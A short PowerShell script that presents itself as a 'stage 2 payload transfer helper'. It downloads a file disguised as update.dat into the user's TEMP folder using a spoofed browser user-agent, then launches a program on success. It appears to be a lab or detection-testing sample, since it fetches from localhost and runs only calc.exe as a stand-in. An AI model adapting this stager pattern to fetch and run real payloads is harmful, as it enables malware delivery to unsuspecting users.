<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
$TransferUrl = "https://localhost:9001/assets/update.dat"
$Stage2Path = "$env:TEMP\update.dat"
$TransferTimeout = 151
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-Stage2Download -SourceUrl $TransferUrl -DestinationPath $Stage2Path -TimeoutSec $TransferTimeout -UserAgent $UserAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Start-Sleep -Seconds 40
